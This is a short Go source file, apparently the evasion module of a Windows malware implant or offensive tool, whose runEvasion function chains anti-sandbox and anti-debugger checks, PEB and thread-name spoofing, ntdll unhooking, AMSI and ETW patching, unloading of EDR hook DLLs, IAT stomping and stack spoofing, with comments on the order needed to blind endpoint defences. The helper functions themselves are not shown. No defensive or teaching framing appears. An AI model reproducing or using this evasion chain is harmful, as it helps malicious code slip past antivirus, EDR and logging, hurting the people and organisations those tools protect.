//go:build windows
// +build windows

package evasion

func runEvasion() {
	exitIfWinPE()
	evadeSandbox()
	evadeDebugger()
	hideThreadFromDebugger() // kernel-level: hide thread from debugger attach + reduce ETW-TI
	spoofPEB()               // change visible process name/cmdline before any EDR check
	spoofThreadName(stackStr('W', 'o', 'r', 'k', 'e', 'r', 'T', 'h', 'r', 'e', 'a', 'd'))
	unhookNtdll()            // clean NT stubs — must run before any NT-based patches
	cloakPEHeader()
	patchAMSI()
	patchETW()
	patchEtwRegister() // block future ETW provider registrations
	unloadEDRDLLs()   // remove already-loaded EDR hook DLLs (must precede blockNonMicrosoftDLLs)
	iatStomp()         // zero IAT so memory dumps reveal no imports
	initSpoofing()     // pre-alloc MEM_IMAGE fake stack before ACG blocks new allocs
	blockNonMicrosoftDLLs() // prevent EDR DLL injection
	restrictImageLoad()      // block remote/low-IL image loads, prefer System32
	blockDynamicCode()       // ACG: no new RWX pages after this point — must be last
}
